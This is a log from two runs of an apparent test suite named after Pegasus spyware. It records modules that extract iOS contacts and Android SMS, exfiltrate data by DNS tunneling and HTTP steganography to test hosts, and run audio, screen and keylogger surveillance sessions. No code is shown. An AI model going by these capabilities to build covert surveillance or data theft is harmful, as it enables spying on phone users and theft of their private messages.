2025-08-05 01:02:55,230 - exfiltration_engine - ERROR - Error extracting iOS contacts: unable to open database file
2025-08-05 01:02:55,230 - exfiltration_engine - WARNING - Database not found: /fake/path/mmssms.db, using sample data
2025-08-05 01:02:55,230 - __main__ - ERROR - Data exfiltration demo failed: 'content'
2025-08-05 01:02:55,230 - __main__ - ERROR - Surveillance demo failed: 'RealtimeSurveillanceEngine' object has no attribute 'start_audio_recording'
2025-08-05 01:02:55,230 - __main__ - ERROR - Integration scenario failed: 'RealtimeSurveillanceEngine' object has no attribute 'start_audio_recording'
2025-08-05 01:02:55,231 - pegasus_test_suite - INFO - ⏭️ iMessage Module Import: SKIP (0.00s)
2025-08-05 01:02:55,233 - exfiltration_engine - ERROR - Error extracting iOS contacts: no such table: ABPerson
2025-08-05 01:02:55,233 - pegasus_test_suite - INFO - ✅ iOS Contacts Extraction: PASS (0.00s)
2025-08-05 01:02:55,233 - exfiltration_engine - WARNING - Database not found: /tmp/test_messages.db, using sample data
2025-08-05 01:02:55,233 - pegasus_test_suite - INFO - ✅ Android Messages Extraction: PASS (0.00s)
2025-08-05 01:02:56,249 - exfiltration_engine - INFO - DNS exfiltration completed: 22 bytes to test.example.com
2025-08-05 01:02:56,249 - pegasus_test_suite - INFO - ✅ DNS Tunneling: PASS (1.02s)
2025-08-05 01:02:58,251 - exfiltration_engine - INFO - HTTP steganography exfiltration completed: 22 bytes to https://httpbin.org/post
2025-08-05 01:02:58,252 - pegasus_test_suite - INFO - ✅ HTTP Steganography: PASS (2.00s)
2025-08-05 01:02:58,253 - pegasus_test_suite - INFO - ✅ Surveillance Capabilities Check: PASS (0.00s)
2025-08-05 01:02:58,254 - surveillance_engine - INFO - Starting audio surveillance session: audio_20250805_010258
2025-08-05 01:02:58,255 - pegasus_test_suite - INFO - ✅ Audio Surveillance: PASS (0.00s)
2025-08-05 01:02:58,255 - surveillance_engine - INFO - Starting screen surveillance session: screen_20250805_010258
2025-08-05 01:02:58,256 - pegasus_test_suite - INFO - ✅ Screen Surveillance: PASS (0.00s)
2025-08-05 01:02:58,256 - surveillance_engine - INFO - Starting keylogger surveillance session: keylog_20250805_010258
2025-08-05 01:02:58,257 - pegasus_test_suite - INFO - ✅ Keylogger Surveillance: PASS (0.00s)
2025-08-05 01:02:58,257 - surveillance_engine - INFO - Audio recording task started for session audio_20250805_010258
2025-08-05 01:02:58,257 - surveillance_engine - INFO - Screen capture task started for session screen_20250805_010258
2025-08-05 01:02:59,402 - surveillance_engine - INFO - Keylogger task started for session keylog_20250805_010258
2025-08-05 01:03:00,314 - surveillance_engine - INFO - Audio surveillance session audio_20250805_010258 ended
2025-08-05 01:03:01,503 - surveillance_engine - INFO - Stopped 2 surveillance sessions
2025-08-05 01:03:01,504 - pegasus_test_suite - INFO - ✅ Stop All Surveillance: PASS (0.00s)
2025-08-05 01:03:01,504 - pegasus_test_suite - INFO - ⏭️ Exploit + Surveillance Integration: SKIP (0.00s)
2025-08-05 01:03:01,504 - surveillance_engine - INFO - Starting screen surveillance session: screen_20250805_010301
2025-08-05 01:03:01,504 - surveillance_engine - INFO - Screen capture task started for session screen_20250805_010301
2025-08-05 01:03:06,687 - exfiltration_engine - INFO - DNS exfiltration completed: 24 bytes to test.example.com
2025-08-05 01:03:06,688 - surveillance_engine - INFO - Stopped 1 surveillance sessions
2025-08-05 01:03:06,688 - pegasus_test_suite - INFO - ✅ Surveillance + Exfiltration Integration: PASS (5.18s)
2025-08-05 01:03:06,689 - pegasus_test_suite - INFO - Test report saved to: reports/pegasus_test_report_20250805_010306.json
2025-08-05 01:03:06,689 - __main__ - ERROR - Test suite failed: 'PegasusTestSuite' object has no attribute 'get_test_results'
2025-08-05 01:03:06,689 - surveillance_engine - INFO - Screen surveillance session screen_20250805_010301 ended
2025-08-05 01:03:06,689 - surveillance_engine - INFO - Screen surveillance session screen_20250805_010258 ended
2025-08-05 01:03:06,689 - surveillance_engine - INFO - Keylogger surveillance session keylog_20250805_010258 ended
2025-08-05 01:06:43,539 - exfiltration_engine - ERROR - Error extracting iOS contacts: unable to open database file
2025-08-05 01:06:43,539 - exfiltration_engine - WARNING - Database not found: /fake/path/mmssms.db, using sample data
2025-08-05 01:06:43,539 - __main__ - ERROR - Data exfiltration demo failed: 'content'
2025-08-05 01:06:43,539 - __main__ - ERROR - Surveillance demo failed: 'RealtimeSurveillanceEngine' object has no attribute 'start_audio_recording'
2025-08-05 01:06:43,539 - __main__ - ERROR - Integration scenario failed: 'RealtimeSurveillanceEngine' object has no attribute 'start_audio_recording'
2025-08-05 01:06:43,539 - pegasus_test_suite - INFO - ⏭️ iMessage Module Import: SKIP (0.00s)
2025-08-05 01:06:43,541 - exfiltration_engine - ERROR - Error extracting iOS contacts: no such table: ABPerson
2025-08-05 01:06:43,541 - pegasus_test_suite - INFO - ✅ iOS Contacts Extraction: PASS (0.00s)
2025-08-05 01:06:43,541 - exfiltration_engine - WARNING - Database not found: /tmp/test_messages.db, using sample data
2025-08-05 01:06:43,541 - pegasus_test_suite - INFO - ✅ Android Messages Extraction: PASS (0.00s)
2025-08-05 01:06:44,553 - exfiltration_engine - INFO - DNS exfiltration completed: 22 bytes to test.example.com
2025-08-05 01:06:44,554 - pegasus_test_suite - INFO - ✅ DNS Tunneling: PASS (1.01s)
2025-08-05 01:06:46,556 - exfiltration_engine - INFO - HTTP steganography exfiltration completed: 22 bytes to https://httpbin.org/post
2025-08-05 01:06:46,556 - pegasus_test_suite - INFO - ✅ HTTP Steganography: PASS (2.00s)
2025-08-05 01:06:46,557 - pegasus_test_suite - INFO - ✅ Surveillance Capabilities Check: PASS (0.00s)
2025-08-05 01:06:46,557 - surveillance_engine - INFO - Starting audio surveillance session: audio_20250805_010646
2025-08-05 01:06:46,559 - pegasus_test_suite - INFO - ✅ Audio Surveillance: PASS (0.00s)
2025-08-05 01:06:46,559 - surveillance_engine - INFO - Starting screen surveillance session: screen_20250805_010646
2025-08-05 01:06:46,560 - pegasus_test_suite - INFO - ✅ Screen Surveillance: PASS (0.00s)
2025-08-05 01:06:46,560 - surveillance_engine - INFO - Starting keylogger surveillance session: keylog_20250805_010646
2025-08-05 01:06:46,560 - pegasus_test_suite - INFO - ✅ Keylogger Surveillance: PASS (0.00s)
2025-08-05 01:06:46,560 - surveillance_engine - INFO - Audio recording task started for session audio_20250805_010646
2025-08-05 01:06:46,560 - surveillance_engine - INFO - Screen capture task started for session screen_20250805_010646
2025-08-05 01:06:47,649 - surveillance_engine - INFO - Keylogger task started for session keylog_20250805_010646
2025-08-05 01:06:49,871 - surveillance_engine - INFO - Audio surveillance session audio_20250805_010646 ended
2025-08-05 01:06:49,875 - surveillance_engine - INFO - Stopped 2 surveillance sessions
2025-08-05 01:06:49,875 - pegasus_test_suite - INFO - ✅ Stop All Surveillance: PASS (0.00s)
2025-08-05 01:06:49,875 - pegasus_test_suite - INFO - ⏭️ Exploit + Surveillance Integration: SKIP (0.00s)
2025-08-05 01:06:49,876 - surveillance_engine - INFO - Starting screen surveillance session: screen_20250805_010649
2025-08-05 01:06:49,876 - surveillance_engine - INFO - Screen capture task started for session screen_20250805_010649
2025-08-05 01:06:54,772 - exfiltration_engine - INFO - DNS exfiltration completed: 24 bytes to test.example.com
2025-08-05 01:06:54,772 - surveillance_engine - INFO - Stopped 1 surveillance sessions
2025-08-05 01:06:54,773 - pegasus_test_suite - INFO - ✅ Surveillance + Exfiltration Integration: PASS (4.90s)
2025-08-05 01:06:54,773 - pegasus_test_suite - INFO - Test report saved to: reports/pegasus_test_report_20250805_010654.json
2025-08-05 01:06:54,774 - __main__ - ERROR - Test suite failed: 'PegasusTestSuite' object has no attribute 'get_test_results'
2025-08-05 01:06:54,774 - surveillance_engine - INFO - Screen surveillance session screen_20250805_010649 ended
2025-08-05 01:06:54,774 - surveillance_engine - INFO - Screen surveillance session screen_20250805_010646 ended
2025-08-05 01:06:54,774 - surveillance_engine - INFO - Keylogger surveillance session keylog_20250805_010646 ended
